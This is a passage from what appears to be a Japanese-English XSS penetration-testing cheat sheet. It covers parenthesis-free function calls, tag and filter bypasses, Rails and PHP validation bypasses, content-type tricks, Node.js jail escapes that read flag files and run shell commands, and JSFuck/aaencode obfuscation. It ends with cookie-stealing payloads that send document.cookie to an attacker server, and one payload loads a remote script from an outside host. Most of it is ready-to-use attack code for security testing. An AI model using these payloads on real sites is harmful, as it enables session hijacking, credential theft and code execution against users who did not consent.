'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意の関数 (alert) 呼び出し**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

There is **JS code** that is using **unsafely data controlled by an attacker** like `location.href` . An attacker, could abuse this to execute arbitrary JS code.\
説明が長くなったため、[**DOM vulnerabilities**](dom-xss.md)はこのページに移動しました。:**


{{#ref}}
dom-xss.md
{{#endref}}

そこでは、**DOM vulnerabilities が何で、どのように発生し、どのように悪用されるか**を詳しく説明しています。\
また、該当記事の最後に[**DOM Clobbering attacks**](dom-xss.md#dom-clobbering)に関する説明があることを忘れないでください。

### Upgrading Self-XSS

### Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a **vulnerable subdomain to XSS**, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

ユーザーがプロフィールを管理者と共有でき、かつそのプロフィール内に self XSS がある場合、管理者がアクセスすると脆弱性が発動します。

### Session Mirroring

もし self XSS を見つけ、かつウェブページが管理者向けに **session mirroring** を提供している場合（たとえばクライアントがヘルプを求めると管理者が支援のためにクライアントのセッションで見ている内容を自分のセッションから確認できるような機能）、管理者にあなたの self XSS をトリガーさせ、管理者のクッキー/セッションを盗むことができます。

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

When a web app uses Emscripten/WASM, constant strings (like HTML format stubs) live in writable linear memory. A single in‑WASM overflow (e.g., unchecked memcpy in an edit path) can corrupt adjacent structures and redirect writes to those constants. Overwriting a template such as "<article><p>%.*s</p></article>" to "<img src=1 onerror=%.*s>" turns sanitized input into a JavaScript handler value and yields immediate DOM XSS on render.

詳細なエクスプロイトワークフロー、DevTools のメモリヘルパー、対策については専用ページを参照してください：

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

You could check is the **reflected values** are being **unicode normalized** in the server (or in the client side) and abuse this functionality to bypass protections. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

**RoR mass assignment** により、HTML 内に引用符が挿入され、引用符の制限がバイパスされて、タグ内に追加のフィールド（onfocus）を追加できるようになります。\
フォームの例 ([from this report](https://hackerone.com/reports/709336))、ペイロードを送信すると:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
ペア "Key","Value" は次のように返されます:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
すると、onfocus 属性が挿入され、XSS が発生します。

### 特殊な組み合わせ
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### 302 レスポンスでの header injection を伴う XSS

もし **inject headers in a 302 Redirect response** が可能であれば、**make the browser execute arbitrary JavaScript** を試すことができます。これは **not trivial** です。モダンブラウザは HTTP レスポンスのステータスコードが 302 の場合、HTTP レスポンスボディを解釈しないため、単に cross-site scripting payload を入れても無効です。

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.\
過去に知られているプロトコル: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### 英字・数字・ドットのみ

もし英字・数字・ドットのみの文字で javascript が **execute** する **callback** を指定できるなら、[**このポストのこのセクションを読む**](#javascript-function) と、この挙動を悪用する方法が分かります。

### XSS に有効な `<script>` Content-Types

(出典: [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) `application/octet-stream` のような **content-type** でスクリプトを読み込もうとすると、Chrome は次のエラーを出します:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Chrome が **loaded script** を実行できる **Content-Type** は、const **`kSupportedJavascriptTypes`** に含まれるもののみです（詳細は [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc) を参照してください）。
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSS におけるスクリプトの種類

(出典: [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) それでは、どのタイプがスクリプトを読み込むために指定され得るでしょうか？
```html
<script type="???"></script>
```
答えは:

- **module** (デフォルト、説明不要)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundlesは、HTML、CSS、JS…などのデータをまとめて**`.wbn`**ファイルにパッケージできる機能です。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** インポート構文を改善できる
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
この挙動は[**this writeup**](https://github.com/zwade/yaca/tree/master/solution)でライブラリをevalにリマップするために使用され、悪用するとXSSを引き起こす可能性があります。

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** この機能は主にプリレンダリングが引き起こすいくつかの問題を解決するためのものです。動作は次のようになります：
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types による XSS

(出典 [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 以下のコンテンツタイプはすべてのブラウザで XSS を実行できます:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

他のブラウザでは、他の **`Content-Types`** を使って任意の JS を実行できる場合があります。確認: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml コンテンツタイプ

ページが text/xml コンテンツタイプで返される場合、名前空間を指定して任意の JS を実行することが可能です：
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特殊な置換パターン

`"some {{template}} data".replace("{{template}}", <user_input>)` のようなコードが使われている場合、攻撃者は [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the-replacement) を使用していくつかの保護を回避しようとする可能性があります: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

例えば [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)、ここではスクリプト内で **scape a JSON string** を使い、execute arbitrary code を行うために用いられました。

### Chrome のキャッシュから XSS へ


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

使用できる文字が限られている場合、XSJail に関するこれらの他の有効な解決策を確認してください:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
もし信頼できないコードを実行する前に **everything is undefined** の状態になっていると（[**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves) のように）、任意の信頼できないコードの実行を悪用するために「何もないところから」有用なオブジェクトを生成することが可能です:

- import() を使用する
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- `require` に間接的にアクセスする

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) モジュールは Node.js によって関数でラップされ、次のようになります:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
したがって、そのモジュールから**別の関数を呼び出す**ことができれば、その関数から `arguments.callee.caller.arguments[1]` を使って **`require`** にアクセスすることが可能です:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
前の例と同様に、**use error handlers** を使ってモジュールの **wrapper** にアクセスし、**`require`** 関数を取得することができます:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **同一ページ内の異なる obfuscations:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- より高度な JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS common payloads

### Several payloads in 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

ユーザーをiframe内に留めたままページ内を移動させ、その操作（フォーム送信を含む）を盗む：


{{#ref}}
../iframe-traps.md
{{#endref}}

### Cookies を取得する
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
